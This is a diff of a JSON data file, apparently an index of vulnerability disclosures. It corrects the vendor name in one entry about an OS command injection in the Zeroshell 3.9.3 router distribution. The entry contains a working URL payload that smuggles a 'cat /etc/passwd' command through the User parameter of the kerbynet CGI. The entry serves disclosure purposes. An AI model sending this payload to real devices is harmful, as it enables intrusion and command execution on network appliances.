@@ -217,8 +217,8 @@
 
 
     
-    "snippet": "Vendor:Zeroshell Linux Router22https://zeroshell.org/Product:ZeroShell-3.9.3-X86.isohttps://zeroshell.org/download/  Zeroshell is a Linux based distribution dedicated to the implementation of Route...",
-    "content": "Vendor:Zeroshell Linux Router22https://zeroshell.org/Product:ZeroShell-3.9.3-X86.isohttps://zeroshell.org/download/  Zeroshell is a Linux based distribution dedicated to the implementation of Router and Firewall Appliances completely administrable via web interface. &gt; Zeroshell is available for x86/x86-64 platforms and ARM based devices such as Raspberry Pi.OS Command InjectionWhen I reviewed the earlier vulnerabilities in zeroshell, I discovered that an OS Command Injection vulnerability still exists in its latest version.You can download here.Payload: /cgi-bin/kerbynet?Action=StartSessionSubmit&amp;User='%0acat /etc/passwd%0a'&amp;PW=Reference  Zeroshell 3.6.0/3.7.0 Net Services - Remote Code Execution  https://cwe.mitre.org/data/definitions/78.html"
+    "snippet": "Vendor:Zeroshell Linux Routerhttps://zeroshell.org/Product:ZeroShell-3.9.3-X86.isohttps://zeroshell.org/download/  Zeroshell is a Linux based distribution dedicated to the implementation of Router ...",
+    "content": "Vendor:Zeroshell Linux Routerhttps://zeroshell.org/Product:ZeroShell-3.9.3-X86.isohttps://zeroshell.org/download/  Zeroshell is a Linux based distribution dedicated to the implementation of Router and Firewall Appliances completely administrable via web interface. &gt; Zeroshell is available for x86/x86-64 platforms and ARM based devices such as Raspberry Pi.OS Command InjectionWhen I reviewed the earlier vulnerabilities in zeroshell, I discovered that an OS Command Injection vulnerability still exists in its latest version.You can download here.Payload: /cgi-bin/kerbynet?Action=StartSessionSubmit&amp;User='%0acat /etc/passwd%0a'&amp;PW=Reference  Zeroshell 3.6.0/3.7.0 Net Services - Remote Code Execution  https://cwe.mitre.org/data/definitions/78.html"
   },
   
   {
